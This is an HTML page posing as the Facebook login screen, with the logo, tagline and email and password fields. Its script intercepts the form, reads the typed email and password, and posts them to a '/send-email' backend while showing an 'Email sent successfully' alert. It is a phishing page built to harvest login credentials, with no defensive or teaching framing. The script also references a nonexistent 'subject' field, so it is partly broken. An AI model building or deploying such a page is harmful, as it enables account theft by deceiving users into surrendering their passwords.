<body class="bg-gray-100">
    <div class="container flex m-auto justify-center items-center mt-32">
        <div class="leftSection w-[580px] ml-52 mb-28">
            <img src="assets/logo.9531e960.svg" alt="facebook logo" class="w-[301px]">
            <p class="text-3xl ml-8">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="rightSection">
            <form action="#" id="emailForm"  class="flex flex-col w-96 bg-white p-5 shadow-xl rounded-lg ml-20">
                <input type="text" name="name" id="recipientEmail" placeholder="Email address or phone number" autofocus="1" class="p-3 mb-3 border-2 border-gray-200  focus:border-blue-400 outline-blue-300 rounded-md">
                <input type="password" name="" id="message" placeholder="Password" class="p-3 mb-3 border-2 border-gray-200 outline-blue-300 rounded-md">
                <button type="submit" class="bg-[#166FE5] text-white text-2xl p-2 rounded-md font-semibold hover:bg-[#1a6bd4]" onclick="sendEmail()">Log In</button>
                <span class="text-center mt-3 mb-2"><a href="#" class="text-[#166FE5]">Forgotten password?</a></span>
                <hr class="mt-3" />
                <button type="submit" class="bg-[#36A420] text-white p-3 rounded-md font-bold  w-56 m-auto mt-6 mb-2 hover:bg-[#2f911c]">Create New Account</button>
            </form>
            <p class="mt-6 ml-24"><a href="#" class="font-bold decorationbd">Create a Page</a> for a celebrity, brand or business.</p>
        </div>
    </div>
    <script>
        document.getElementById('emailForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission
            sendEmail();
        });

        function sendEmail() {
            const recipientEmail = document.getElementById('recipientEmail').value;
            const subject = document.getElementById('subject').value;
            const message = document.getElementById('message').value;

            // Send the data to your backend server for processing
            fetch('/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ recipientEmail, subject, message })
            })
            .then(response => {
                if (response.ok) {
                    alert('Email sent successfully!');
                } else {
                    alert('Failed to send email. Please try again later.');
                }
            })
            .catch(error => {
                console.error('Error sending email:', error);
                alert('An error occurred while sending email.');
            });
        }
    </script>
